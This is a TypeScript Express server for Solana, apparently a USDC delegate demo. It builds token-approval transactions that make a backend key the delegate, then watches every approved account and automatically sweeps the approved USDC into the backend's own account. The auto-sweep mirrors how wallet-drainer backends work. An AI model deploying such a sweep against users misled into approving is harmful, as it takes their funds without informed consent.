import 'dotenv/config';

import express, { type Request, type Response } from 'express';
import bs58 from 'bs58';
import {
  getAccount,
  getAssociatedTokenAddressSync,
  getMint,
  createApproveCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  createTransferCheckedInstruction,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
} from '@solana/web3.js';
import { appConfig } from './config.js';
import {
  getMysqlPersistenceConfig,
  getPersistedFingerprint,
  initMysqlPersistence,
  persistApprovalTransferRecord,
} from './mysql.js';

// 初始化 Express 服务，并启用 JSON 请求体解析。
const app = express();
app.use(express.json());

// 前端请求“构建授权交易”时提交的参数。
type ApproveBody = {
  owner: string;
  amountUi: string;
  ownerTokenAccount?: string;
};

// 前端请求“后台代扣转账”时提交的参数。
type DelegateTransferBody = {
  owner: string;
  destinationOwner?: string;
  amountUi: string;
  ownerTokenAccount?: string;
  destinationTokenAccount?: string;
};

// 把字符串安全地转成 PublicKey，统一输出清晰的字段错误信息。
function parsePublicKey(value: string, fieldName: string): PublicKey {
  try {
    return new PublicKey(value);
  } catch {
    throw new Error(`Invalid ${fieldName}`);
  }
}

// 把带小数的 UI 金额转成链上使用的最小单位整数。
function parseUiAmount(amountUi: string, decimals: number): bigint {
  if (!/^\d+(\.\d+)?$/.test(amountUi)) {
    throw new Error('amountUi must be a positive decimal string');
  }

  const [whole, fraction = ''] = amountUi.split('.');
  if (fraction.length > decimals) {
    throw new Error(`amountUi has more than ${decimals} decimal places`);
  }

  const paddedFraction = fraction.padEnd(decimals, '0');
  return BigInt(`${whole}${paddedFraction}`);
}

// 把链上最小单位整数格式化为前端更易读的 UI 金额字符串。
function formatUiAmount(amount: bigint, decimals: number): string {
  const divisor = 10n ** BigInt(decimals);
  const whole = amount / divisor;
  const fraction = amount % divisor;

  if (fraction === 0n) {
    return whole.toString();
  }

  return `${whole.toString()}.${fraction.toString().padStart(decimals, '0').replace(/0+$/, '')}`;
}

// 支持 Base58 和 JSON 数组两种私钥格式，便于本地和线上统一配置。
function parseBackendKeypair(secret: string): Keypair {
  const trimmed = secret.trim();

  try {
    if (trimmed.startsWith('[')) {
      return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(trimmed) as number[]));
    }

    return Keypair.fromSecretKey(bs58.decode(trimmed));
  } catch {
    throw new Error('Invalid BACKEND_SECRET_KEY format');
  }
}

// 服务启动时一次性解析核心配置，后续请求直接复用。
const rpcUrl = appConfig.rpcUrl;
const usdcMint = parsePublicKey(appConfig.usdcMint, 'USDC_MINT');
const backendKeypair = parseBackendKeypair(appConfig.backendSecretKey);
const defaultDestinationOwner = appConfig.defaultDestinationOwner || backendKeypair.publicKey.toBase58();
const defaultDestinationOwnerPubkey = parsePublicKey(
  defaultDestinationOwner,
  'DEFAULT_DESTINATION_OWNER',
);
const connection = new Connection(rpcUrl, appConfig.solanaCommitment);
const port = appConfig.port;
const listenerEnabled = appConfig.listenerEnabled;
const autoTransferEnabled = appConfig.autoTransferEnabled;
const solanaCommitment = appConfig.solanaCommitment;
const mysqlPersistenceConfig = getMysqlPersistenceConfig();
const processingTokenAccounts = new Set<string>();
const TOKEN_ACCOUNT_SIZE = 165;
const TOKEN_MINT_OFFSET = 0;
const TOKEN_DELEGATE_OFFSET = 76;

// 读取 USDC Mint 精度，便于前后端都使用统一的金额换算逻辑。
async function resolveMintDecimals(): Promise<number> {
  const mintInfo = await getMint(connection, usdcMint);
  return mintInfo.decimals;
}

// 用户未显式传入 token account 时，默认取该 owner 对应的 USDC ATA。
function resolveOwnerTokenAccount(owner: PublicKey, provided?: string): PublicKey {
  if (provided) {
    return parsePublicKey(provided, 'ownerTokenAccount');
  }

  return getAssociatedTokenAddressSync(usdcMint, owner);
}

// 目标地址未显式传入 token account 时，默认取目标 owner 对应的 USDC ATA。
function resolveDestinationTokenAccount(destinationOwner: PublicKey, provided?: string): PublicKey {
  if (provided) {
    return parsePublicKey(provided, 'destinationTokenAccount');
  }

  return getAssociatedTokenAddressSync(usdcMint, destinationOwner);
}

// 监听模式下，B 既是 delegate，也是最终收款地址，因此目标 ATA 固定为 B 的 USDC ATA。
function resolveDelegateReceiveTokenAccount(): PublicKey {
  return resolveDestinationTokenAccount(backendKeypair.publicKey);
}

// 返回 Token Program 监听所需的过滤条件，只关注“USDC 且 delegate == B”的账户。
function buildApprovalListenerFilters() {
  return [
    { dataSize: TOKEN_ACCOUNT_SIZE },
    { memcmp: { offset: TOKEN_MINT_OFFSET, bytes: usdcMint.toBase58() } },
    { memcmp: { offset: TOKEN_DELEGATE_OFFSET, bytes: backendKeypair.publicKey.toBase58() } },
  ];
}

// 自动转账时只取“余额”和“已授权额度”中的较小值，避免链上失败。
function resolveTransferableAmount(balance: bigint, delegatedAmount: bigint): bigint {
  return balance < delegatedAmount ? balance : delegatedAmount;
}

// 把当前 delegate 名下的所有 USDC 授权账户转成前端可直接展示的列表结构。
async function listApprovedUsdcAccounts() {
  const decimals = await resolveMintDecimals();
  const accounts = await connection.getProgramAccounts(TOKEN_PROGRAM_ID, {
    commitment: solanaCommitment,
    filters: buildApprovalListenerFilters(),
  });

  const items = await Promise.all(
    accounts.map(async (account) => {
      const sourceAccount = await getAccount(connection, account.pubkey);
      const transferableAmount = resolveTransferableAmount(
        sourceAccount.amount,
        sourceAccount.delegatedAmount,
      );

      return {
        sourceTokenAccount: account.pubkey.toBase58(),
        ownerWallet: sourceAccount.owner.toBase58(),
        delegateWallet: backendKeypair.publicKey.toBase58(),
        balanceRaw: sourceAccount.amount.toString(),
        balanceUi: formatUiAmount(sourceAccount.amount, decimals),
        delegatedAmountRaw: sourceAccount.delegatedAmount.toString(),
        delegatedAmountUi: formatUiAmount(sourceAccount.delegatedAmount, decimals),
        transferableAmountRaw: transferableAmount.toString(),
        transferableAmountUi: formatUiAmount(transferableAmount, decimals),
      };
    }),
  );

  items.sort((left, right) => {
    const diff = BigInt(right.transferableAmountRaw) - BigInt(left.transferableAmountRaw);
    if (diff > 0n) {
      return 1;
    }
    if (diff < 0n) {
      return -1;
    }
    return left.ownerWallet.localeCompare(right.ownerWallet);
  });

  return {
    mint: usdcMint.toBase58(),
    delegate: backendKeypair.publicKey.toBase58(),
    decimals,
    total: items.length,
    items,
  };
}

// 监听到授权后，后台自动把 A 可转的 USDC 拉到 B 自己的 USDC ATA。
async function transferApprovedUsdcToDelegate(
  sourceTokenAccount: PublicKey,
  trigger: string,
  observedSlot: number | null = null,
): Promise<void> {
  const sourceTokenAccountBase58 = sourceTokenAccount.toBase58();
  if (processingTokenAccounts.has(sourceTokenAccountBase58)) {
    return;
  }

  processingTokenAccounts.add(sourceTokenAccountBase58);

  try {
    const sourceAccount = await getAccount(connection, sourceTokenAccount);
    const ownerWallet = sourceAccount.owner.toBase58();
    const delegateWallet = backendKeypair.publicKey.toBase58();
    const destinationTokenAccount = resolveDelegateReceiveTokenAccount().toBase58();
    const tokenBalanceRaw = sourceAccount.amount.toString();
    const delegatedAmountRaw = sourceAccount.delegatedAmount.toString();
    const transferableAmountRaw = resolveTransferableAmount(
      sourceAccount.amount,
      sourceAccount.delegatedAmount,
    ).toString();
    const fingerprint = `${tokenBalanceRaw}:${delegatedAmountRaw}:${destinationTokenAccount}`;

    if (!sourceAccount.delegate || !sourceAccount.delegate.equals(backendKeypair.publicKey)) {
      await persistApprovalTransferRecord({
        sourceTokenAccount: sourceTokenAccountBase58,
        ownerWallet,
        delegateWallet,
        destinationTokenAccount,
        mint: usdcMint.toBase58(),
        triggerSource: trigger,
        observedSlot,
        tokenBalanceRaw,
        delegatedAmountRaw,
        transferableAmountRaw,
        fingerprint,
        status: 'delegate_mismatch',
        errorMessage: 'delegate no longer matches backend',
      });
      return;
    }

    const rawAmount = resolveTransferableAmount(sourceAccount.amount, sourceAccount.delegatedAmount);
    const persistedFingerprint = await getPersistedFingerprint(sourceTokenAccountBase58);
    if (persistedFingerprint && persistedFingerprint === fingerprint) {
      await persistApprovalTransferRecord({
        sourceTokenAccount: sourceTokenAccountBase58,
        ownerWallet,
        delegateWallet,
        destinationTokenAccount,
        mint: usdcMint.toBase58(),
        triggerSource: trigger,
        observedSlot,
        tokenBalanceRaw,
        delegatedAmountRaw,
        transferableAmountRaw,
        fingerprint,
        status: 'duplicate',
        errorMessage: 'same fingerprint already processed',
      });
      return;
    }

    // 只要首次观察到“USDC 已授权给目标地址”，就先把授权事件单独记入 MySQL。
    await persistApprovalTransferRecord({
      sourceTokenAccount: sourceTokenAccountBase58,
      ownerWallet,
      delegateWallet,
      destinationTokenAccount,
      mint: usdcMint.toBase58(),
      triggerSource: trigger,
      observedSlot,
      tokenBalanceRaw,
      delegatedAmountRaw,
      transferableAmountRaw,
      fingerprint,
      status: 'approved',
    });

    if (!autoTransferEnabled) {
      return;
    }

    await persistApprovalTransferRecord({
      sourceTokenAccount: sourceTokenAccountBase58,
      ownerWallet,
      delegateWallet,
      destinationTokenAccount,
      mint: usdcMint.toBase58(),
      triggerSource: trigger,
      observedSlot,
      tokenBalanceRaw,
      delegatedAmountRaw,
      transferableAmountRaw,
      fingerprint,
      status: 'processing',
    });

    if (rawAmount <= 0n) {
      await persistApprovalTransferRecord({
        sourceTokenAccount: sourceTokenAccountBase58,
        ownerWallet,
        delegateWallet,
        destinationTokenAccount,
        mint: usdcMint.toBase58(),
        triggerSource: trigger,
        observedSlot,
        tokenBalanceRaw,
        delegatedAmountRaw,
        transferableAmountRaw,
        fingerprint,
        status: 'skipped',
        errorMessage: 'transferable amount is zero',
      });
      return;
    }

    const destinationTokenAccountPubkey = resolveDelegateReceiveTokenAccount();
    if (sourceTokenAccount.equals(destinationTokenAccountPubkey)) {
      await persistApprovalTransferRecord({
        sourceTokenAccount: sourceTokenAccountBase58,
        ownerWallet,
        delegateWallet,
        destinationTokenAccount,
        mint: usdcMint.toBase58(),
        triggerSource: trigger,
        observedSlot,
        tokenBalanceRaw,
        delegatedAmountRaw,
        transferableAmountRaw,
        fingerprint,
        status: 'skipped',
        errorMessage: 'source and destination token accounts are the same',
      });
      return;
    }

    const decimals = await resolveMintDecimals();
    const instructions = [];
    const destinationInfo = await connection.getAccountInfo(destinationTokenAccountPubkey);
    if (!destinationInfo) {
      // B 的目标 ATA 不存在时先自动创建，确保后续转账一次成功。
      instructions.push(
        createAssociatedTokenAccountInstruction(
          backendKeypair.publicKey,
          destinationTokenAccountPubkey,
          backendKeypair.publicKey,
          usdcMint,
        ),
      );
    }

    instructions.push(
      createTransferCheckedInstruction(
        sourceTokenAccount,
        usdcMint,
        destinationTokenAccountPubkey,
        backendKeypair.publicKey,
        rawAmount,
        decimals,
      ),
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash(solanaCommitment);
    const tx = new Transaction({
      feePayer: backendKeypair.publicKey,
      blockhash,
      lastValidBlockHeight,
    }).add(...instructions);

    tx.sign(backendKeypair);
    const signature = await connection.sendRawTransaction(tx.serialize(), {
      preflightCommitment: solanaCommitment,
    });

    const confirmation = await connection.confirmTransaction(
      {
        signature,
        blockhash,
        lastValidBlockHeight,
      },
      solanaCommitment,
    );

    if (confirmation.value.err) {
      throw new Error(`Auto transfer failed: ${JSON.stringify(confirmation.value.err)}`);
    }

    await persistApprovalTransferRecord({
      sourceTokenAccount: sourceTokenAccountBase58,
      ownerWallet,
      delegateWallet,
      destinationTokenAccount,
      mint: usdcMint.toBase58(),
      triggerSource: trigger,
      observedSlot,
      tokenBalanceRaw,
      delegatedAmountRaw,
      transferableAmountRaw: rawAmount.toString(),
      fingerprint,
      status: 'transferred',
      transferSignature: signature,
    });

    console.log(
      `[listener] auto transferred ${rawAmount.toString()} raw USDC from ${sourceTokenAccountBase58} to ${destinationTokenAccount} via ${trigger}, signature=${signature}`,
    );
  } catch (error) {
    const normalizedError = error instanceof Error ? error.message : 'unknown listener error';
    try {
      const sourceAccount = await getAccount(connection, sourceTokenAccount);
      await persistApprovalTransferRecord({
        sourceTokenAccount: sourceTokenAccountBase58,
        ownerWallet: sourceAccount.owner.toBase58(),
        delegateWallet: backendKeypair.publicKey.toBase58(),
        destinationTokenAccount: resolveDelegateReceiveTokenAccount().toBase58(),
        mint: usdcMint.toBase58(),
        triggerSource: trigger,
        observedSlot,
        tokenBalanceRaw: sourceAccount.amount.toString(),
        delegatedAmountRaw: sourceAccount.delegatedAmount.toString(),
        transferableAmountRaw: resolveTransferableAmount(
          sourceAccount.amount,
          sourceAccount.delegatedAmount,
        ).toString(),
        fingerprint: null,
        status: 'failed',
        errorMessage: normalizedError,
      });
    } catch (persistError) {
      console.error('[listener] failed to persist listener error state', persistError);
    }

    console.error(
      `[listener] failed to auto transfer from ${sourceTokenAccountBase58} via ${trigger}`,
      error,
    );
  } finally {
    processingTokenAccounts.delete(sourceTokenAccountBase58);
  }
}

// 启动时先扫描一次历史上已经授权给 B 的 USDC 账户，避免监听启动前的授权被漏掉。
async function scanExistingApprovals(): Promise<void> {
  const accounts = await connection.getProgramAccounts(TOKEN_PROGRAM_ID, {
    commitment: solanaCommitment,
    filters: buildApprovalListenerFilters(),
  });

  console.log(`[listener] found ${accounts.length} approved USDC token accounts on startup`);

  for (const account of accounts) {
    await transferApprovedUsdcToDelegate(account.pubkey, 'startup-scan');
  }
}

// 持续监听“USDC + delegate == B”的 token account 变更，一旦出现授权或余额变化就尝试自动转账。
async function startApprovalListener(): Promise<void> {
  if (!listenerEnabled) {
    console.log('[listener] disabled by ENABLE_APPROVAL_LISTENER=false');
    return;
  }

  await scanExistingApprovals();

  const subscriptionId = connection.onProgramAccountChange(
    TOKEN_PROGRAM_ID,
    (keyedAccountInfo, context) => {
      void transferApprovedUsdcToDelegate(
        keyedAccountInfo.accountId,
        `program-change@slot-${context.slot}`,
        context.slot,
      );
    },
    solanaCommitment,
    buildApprovalListenerFilters(),
  );

  console.log(
    `[listener] subscribed to USDC delegate approvals for ${backendKeypair.publicKey.toBase58()} with subscription ${subscriptionId}`,
  );
}

// 健康检查接口，供网页和联调脚本读取当前运行配置。
app.get('/health', async (_req: Request, res: Response) => {
  res.json({
    ok: true,
    rpcUrl,
    usdcMint: usdcMint.toBase58(),
    backendDelegate: backendKeypair.publicKey.toBase58(),
    listenerEnabled,
    autoTransferEnabled,
    solanaCommitment,
    delegateReceiveTokenAccount: resolveDelegateReceiveTokenAccount().toBase58(),
    defaultDestinationOwner: defaultDestinationOwnerPubkey.toBase58(),
    defaultDestinationTokenAccount: resolveDestinationTokenAccount(defaultDestinationOwnerPubkey).toBase58(),
    mysqlPersistenceEnabled: mysqlPersistenceConfig.enabled,
    mysqlDatabase: mysqlPersistenceConfig.enabled ? mysqlPersistenceConfig.database : null,
  });
});

// 查询当前链上已授权给后台 delegate 的 USDC 账户列表，供前端展示监控面板。
app.get('/approvals', async (_req: Request, res: Response) => {
  try {
    const payload = await listApprovedUsdcAccounts();
    res.json(payload);
  } catch (error) {
    res.status(400).json({
      error: error instanceof Error ? error.message : 'Unknown error',
    });
  }
});

// 构建一笔“用户授权后台为 delegate”的未签名交易，由前端钱包完成签名和发送。
app.post('/approve/build', async (req: Request<unknown, unknown, ApproveBody>, res: Response) => {
  try {
    const { owner, amountUi, ownerTokenAccount } = req.body;
    if (!owner || !amountUi) {
      throw new Error('owner and amountUi are required');
    }

    const ownerPubkey = parsePublicKey(owner, 'owner');
    const sourceTokenAccount = resolveOwnerTokenAccount(ownerPubkey, ownerTokenAccount);
    const decimals = await resolveMintDecimals();
    const rawAmount = parseUiAmount(amountUi, decimals);

    // 这里生成的是 SPL Token 的 ApproveChecked 指令，对应 ERC20 的 approve。
    const approveInstruction = createApproveCheckedInstruction(
      sourceTokenAccount,
      usdcMint,
      backendKeypair.publicKey,
      ownerPubkey,
      rawAmount,
      decimals,
    );

    // 只负责构建交易，不在后端签名；用户稍后会在钱包里完成签名和广播。
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash(solanaCommitment);
    const tx = new Transaction({
      feePayer: ownerPubkey,
      blockhash,
      lastValidBlockHeight,
    }).add(approveInstruction);

    res.json({
      delegate: backendKeypair.publicKey.toBase58(),
      sourceTokenAccount: sourceTokenAccount.toBase58(),
      mint: usdcMint.toBase58(),
      amountUi,
      rawAmount: rawAmount.toString(),
      decimals,
      serializedTransactionBase64: tx.serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      }).toString('base64'),
      note: 'User must sign and send this transaction to approve the backend as delegate.',
    });
  } catch (error) {
    res.status(400).json({
      error: error instanceof Error ? error.message : 'Unknown error',
    });
  }
});

// 后台作为 delegate 发起真正的 USDC 转账，前提是用户已先完成授权。
app.post(
  '/delegate/transfer',
  async (req: Request<unknown, unknown, DelegateTransferBody>, res: Response) => {
    try {
      const { owner, destinationOwner, amountUi, ownerTokenAccount, destinationTokenAccount } =
        req.body;

      if (!owner || !amountUi) {
        throw new Error('owner and amountUi are required');
      }

      const ownerPubkey = parsePublicKey(owner, 'owner');
      const destinationOwnerPubkey = destinationOwner
        ? parsePublicKey(destinationOwner, 'destinationOwner')
        : defaultDestinationOwnerPubkey;
      const sourceTokenAccount = resolveOwnerTokenAccount(ownerPubkey, ownerTokenAccount);
      const targetTokenAccount = resolveDestinationTokenAccount(
        destinationOwnerPubkey,
        destinationTokenAccount,
      );
      const decimals = await resolveMintDecimals();
      const rawAmount = parseUiAmount(amountUi, decimals);

      // 先检查当前 source token account 的 delegate 是否就是本后台。
      const sourceAccount = await getAccount(connection, sourceTokenAccount);
      if (!sourceAccount.delegate || !sourceAccount.delegate.equals(backendKeypair.publicKey)) {
        throw new Error('Backend is not the current delegate for the source token account');
      }

      // 再检查剩余额度是否足够，避免发起一笔必然失败的链上交易。
      if (sourceAccount.delegatedAmount < rawAmount) {
        throw new Error(
          `Delegated allowance is insufficient. Remaining: ${sourceAccount.delegatedAmount.toString()}`,
        );
      }

      const instructions = [];
      const targetInfo = await connection.getAccountInfo(targetTokenAccount);
      if (!targetInfo) {
        // 目标 ATA 不存在时，后台先垫付租金帮目标地址创建。
        instructions.push(
          createAssociatedTokenAccountInstruction(
            backendKeypair.publicKey,
            targetTokenAccount,
            destinationOwnerPubkey,
            usdcMint,
          ),
        );
      }
      // 这里才是 delegate 代表用户执行的 TransferChecked。

      instructions.push(
        createTransferCheckedInstruction(
          sourceTokenAccount,
          usdcMint,
          targetTokenAccount,
          backendKeypair.publicKey,
          rawAmount,
          decimals,
        ),
      );

      // 后台私钥负责支付本次交易手续费并签名广播。
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash(solanaCommitment);
      const tx = new Transaction({
        feePayer: backendKeypair.publicKey,
        blockhash,
        lastValidBlockHeight,
      }).add(...instructions);

      tx.sign(backendKeypair);
      const signature = await connection.sendRawTransaction(tx.serialize(), {
        preflightCommitment: solanaCommitment,
      });

      const confirmation = await connection.confirmTransaction(
        {
          signature,
          blockhash,
          lastValidBlockHeight,
        },
        solanaCommitment,
      );

      if (confirmation.value.err) {
        throw new Error(`Transfer failed: ${JSON.stringify(confirmation.value.err)}`);
      }

      // 返回给前端展示的调试信息，便于在页面上查看本次代扣结果。
      res.json({
        signature,
        mint: usdcMint.toBase58(),
        sourceTokenAccount: sourceTokenAccount.toBase58(),
        destinationTokenAccount: targetTokenAccount.toBase58(),
        delegate: backendKeypair.publicKey.toBase58(),
        amountUi,
        rawAmount: rawAmount.toString(),
      });
    } catch (error) {
      res.status(400).json({
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  },
);

// 启动服务时打印关键访问信息，便于本地联调。
app.listen(port, () => {
  console.log(
    `USDC delegate demo listening on http://localhost:${port} with delegate ${backendKeypair.publicKey.toBase58()}`,
  );
});

async function bootstrapBackgroundServices(): Promise<void> {
  await initMysqlPersistence();
  if (mysqlPersistenceConfig.enabled) {
    console.log(
      `[mysql] persistence enabled for database ${mysqlPersistenceConfig.database}`,
    );
  }

  await startApprovalListener();
}

void bootstrapBackgroundServices().catch((error) => {
  console.error('[bootstrap] failed to initialize background services', error);
});
